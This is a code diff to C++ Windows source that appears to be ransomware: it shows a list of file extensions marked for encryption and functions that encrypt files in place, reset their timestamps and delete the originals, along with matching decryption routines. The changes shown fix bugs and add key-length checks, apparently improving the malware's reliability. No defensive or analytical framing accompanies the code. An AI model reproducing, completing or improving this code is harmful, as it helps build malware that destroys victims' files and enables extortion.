@@ -17,7 +17,7 @@ static const char* extention_to_crypt[] = {
 	".xls",".log",".odt",".rtf",".tex",".dat",".pps",".tar",".xml",".m3u",".m4a",".mid",".mpa",
 	".wav",".wma",".asf",".m4v",".mov",".mpg",".3dm",".3ds",".max",".obj",".bmp",".gif",".png",
 	".tiff",".tga",".svg",".ps",".xls",".sql",".apk",".htm",".html",".php",".rss",".php",".xhtml",
-	".ttf",".otf",".7z",".gz",".pkg",".zip",".py",".c",".h",".cpp",".torrent",".part",".odp",".hpp",".rar","."
+	".ttf",".otf",".7z",".gz",".pkg",".zip",".py",".c",".h",".cpp",".torrent",".part",".odp",".hpp",".rar"
 };
 static const size_t extention_count = sizeof(extention_to_crypt) / sizeof(*extention_to_crypt);
 
@@ -32,8 +32,10 @@ void ListPotentialFile(LPCSTR path, list<FILE_DATA> *rep)
 }
 
 
-void AEncryptFile(FILE_DATA file, void* const key, size_t key_len)
+int AEncryptFile(FILE_DATA file, void* const key, size_t key_len)
 {
+	if (key_len > sizeof(GUID))
+		return -1;
 	if (CanAccessFolder(file.cFilePath, GENERIC_READ | GENERIC_WRITE))
 	{
 		HANDLE hFile = CreateFileA(file.cFilePath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);
@@ -56,13 +58,16 @@ void AEncryptFile(FILE_DATA file, void* const key, size_t key_len)
 		WriteFile(hFile, data, file.nFileSize.QuadPart, NULL, NULL);
 		SetFileTime(hFile, &file.ftCreationTime, &file.ftLastAccessTime, &file.ftLastWriteTime);
 		delete[] data;
-		CloseHandle(hFile);
 		DeleteFileA(file.cFilePath);
+		CloseHandle(hFile);
+		return 0;
 	}
 }
 
-void ADecryptFile(FILE_DATA file, void* const key, size_t key_len)
+int ADecryptFile(FILE_DATA file, void* const key, size_t key_len)
 {
+	if (key_len > sizeof(GUID))
+		return -1;
 	if (CanAccessFolder(file.cFilePath, GENERIC_READ | GENERIC_WRITE))
 	{
 		GUID new_sign;
@@ -86,6 +91,7 @@ void ADecryptFile(FILE_DATA file, void* const key, size_t key_len)
 			SetFileTime(hFile, &file.ftCreationTime, &file.ftLastAccessTime, &file.ftLastWriteTime);
 		}
 		CloseHandle(hFile);
+		return 0;
 	}	
 }
 
